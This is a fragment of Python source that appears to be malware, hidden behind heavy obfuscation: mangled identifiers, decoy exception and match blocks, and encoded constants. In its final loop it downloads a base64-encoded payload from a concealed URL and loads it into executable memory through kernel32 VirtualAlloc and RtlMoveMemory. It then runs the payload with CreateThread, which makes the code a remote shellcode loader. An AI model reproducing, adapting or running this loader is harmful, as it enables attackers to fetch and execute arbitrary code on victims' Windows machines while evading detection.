                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _1913: _1913 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1317:
        __6551090758762 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '713' == '19':
        case True:
            raise MemoryError([True])
        case False:
            _1517 = [[True], [False]]
            R_E_D__A_V______(['_1914'])
    raise MemoryError([True])
except MemoryError as _157:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1713: _1713 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _154 = [[(lambda: (lambda _177: _177 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1510: _1510 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _131: _131 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _35:
        try:
            raise MemoryError(__6551090758762)
        except MemoryError as __4544714787879:
            if __4544714787879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __4544714787879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3501612063103 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x9a\x9e\xab\xc2r:'))()
try:
    match '196' == '76':
        case True:
            raise MemoryError([True])
        case False:
            _58 = [[True], [False]]
            R_E_D__A_V______(['_1411'])
    raise MemoryError([True])
except MemoryError as _116:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1917: _1917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1416 = [[(lambda: (lambda _1816: _1816 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1117: _1117 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _1718: _1718 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _14:
        while (lambda: (lambda _316: _316 + (lambda: ______R_E_D__A_V_______((lambda: R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyj'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyx'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyp'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyp'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue